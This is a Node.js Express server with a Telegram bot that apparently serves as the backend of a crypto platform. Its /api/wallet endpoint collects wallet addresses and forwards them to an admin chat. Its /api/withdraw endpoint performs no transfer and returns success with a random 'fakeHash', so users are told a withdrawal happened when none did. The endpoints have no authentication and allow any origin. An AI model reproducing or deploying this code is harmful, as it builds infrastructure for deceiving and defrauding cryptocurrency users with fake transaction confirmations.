const express = require("express");
const { Telegraf } = require("telegraf");
const path = require("path");

// --- ENV ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const WEBHOOK_URL = process.env.WEBHOOK_URL;

if (!BOT_TOKEN || !WEBHOOK_URL) {
    console.error("❌ Missing env BOT_TOKEN or WEBHOOK_URL");
    process.exit(1);
}

// --- Telegram Bot ---
const bot = new Telegraf(BOT_TOKEN);

// --- In-memory user data ---
let userData = {
    wallet: null
};

// Telegram Commands
bot.start((ctx) => ctx.reply("Bot running (Webhook Mode) 🚀"));
bot.help((ctx) => ctx.reply("Send /start"));

// Handle messages
bot.on("text", (ctx) => {
    ctx.reply("Message received: " + ctx.message.text);
});

// --- Express Server ---
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// Enable CORS for frontend
app.use((req, res, next) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
    if (req.method === "OPTIONS") return res.sendStatus(200);
    next();
});

// --- API: GET wallet ---
app.get("/api/wallet", (req, res) => {
    res.json({ wallet: userData.wallet });
});

// --- API: POST wallet ---
app.post("/api/wallet", (req, res) => {
    const { wallet } = req.body;

    if (!wallet) return res.json({ success: false, error: "Wallet required" });

    userData.wallet = wallet;

    // Notify Admin
    bot.telegram.sendMessage(
        ADMIN_CHAT_ID,
        `🔐 New wallet bound:\n${wallet}`
    );

    return res.json({ success: true, wallet });
});

// --- API: POST withdraw ---
app.post("/api/withdraw", (req, res) => {
    const { coin, amount, wallet } = req.body;

    if (!wallet) return res.json({ success: false, error: "Wallet missing" });

    const fakeHash = "0x" + Math.random().toString(16).substring(2, 15);

    // Notify Admin
    bot.telegram.sendMessage(
        ADMIN_CHAT_ID,
        `💸 Withdrawal Request\nCoin: ${coin}\nAmount: ${amount}\nWallet: ${wallet}\nHash: ${fakeHash}`
    );

    return res.json({ success: true, hash: fakeHash });
});

// --- Static Frontend ---
app.use(express.static(path.join(__dirname, "public")));

// Fallback
app.get("*", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// --- Webhook Handling ---
app.use(bot.webhookCallback("/telegraf"));

bot.telegram.setWebhook(`${WEBHOOK_URL}/telegraf`);

console.log("🚀 Webhook set to:", `${WEBHOOK_URL}/telegraf`);

// --- Start Server ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server Running on ${PORT}`));
